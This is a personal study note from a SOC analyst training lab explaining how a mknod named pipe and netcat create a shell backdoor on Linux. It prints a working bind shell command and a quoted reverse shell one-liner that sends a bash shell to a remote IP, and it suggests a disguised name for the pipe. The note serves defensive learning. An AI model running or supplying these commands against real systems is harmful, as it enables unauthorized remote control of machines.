---
{"dg-publish":true,"permalink":"/tool-deep-dives/linux/named-pipe/","noteIcon":""}
---

During the [[Webinars and Training/BlackHills SOC Core/BHIS SOCC Notes Overview\|BHIS SOC Analyst Core]] course I took recently, the [[Webinars and Training/BlackHills SOC Core/Labs/BHIS-SOCC-lab-LinuxCLI\|Linux Lab]] had an interesting command where you create a FIFO (First in, First out) "backpipe" with `mknod` (create filesystem node) and `netcat`, effectively creating a shell [[Definitions and Topics/backdoor\|backdoor]] on a [[Tool Deep-Dives/Linux/Linux\|Linux]] system.

```Bash
mknod backpipe p
/bin/bash 0<backpipe | nc -l 2222 1>backpipe
```


Basically, `mknod <string> p` creates a named *pipe* (specified by the `p`) called "backpipe" (though it could functionally be named anything that doesn't conflict with other things; for example in the [[Webinars and Training/BlackHills SOC Core/Labs/BHIS-SOCC-lab-tcpdump#Bonus Lab\|tcpdump Bonus Lab]], one could name it *timesync.svc* or something similar to make it less obvious). This *Named Pipe* allows us to pipe an output *from* any location in the shell *to* any location in the shell.
![ThinkingWithPortals.gif|300](/img/user/Attachments/ThinkingWithPortals.gif)

Additionally, `>` and `<` can be used to redirect input in a script; for example, if we ran `./FiscalReport.sh < 2024Q1.csv`, the `FiscalReport` shell script would input the values from `2024Q1.csv`. 

Let's break backpipe command down and see what's going on.
1. `mknod backpipe p`
	1. Creates a named pipe called "backpipe"
2. `/bin/bash 0<backpipe`
	1. `/bin/bash` reads its [[Tool Deep-Dives/Linux/Linux Data Streams\|standard input]] (`stdin`, file descriptor `0`) from the "backpipe"
		2. `backpipe`'s output becomes `/bin/bash`'s input
3. `|`
	1. The output from the prior command is pipe into the following command
4. `nc -l 2222 1>backpipe`
	1. Netcat listens to port *2222* and the [[Tool Deep-Dives/Linux/Linux Data Streams\|standard output]] (`stdout`, file descriptor `1`) is sent into the named pipe "backpipe"

**To summarize,** this forms a loop; *Netcat* listens for data on port *2222*, sends it to the *backpipe*. The *backpipe* sends the output to *Bash*'s input, and *Bash*'s output gets piped to *Netcat*. 


![nyow-youre-thinking-with-portals-e1303609354625.jpg](/img/user/Attachments/nyow-youre-thinking-with-portals-e1303609354625.jpg)

This is a [[Definitions and Topics/Remote Shell\|Reverse Shell]], allowing an attacker to execute shell commands on a remote system.

[Reverse shell cheatsheet](https://saucer-man.com/reverse/) has a similar command, which I've pasted below:

`mknod backpipe p && nc 10.10.10.10 4444 0<backpipe | /bin/bash 1>backpipe`

This is all pretty wild, but what else can we do with a backpipe?




# Sources
[CTID Github: Named Pipes Micro Emulation Plan](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes)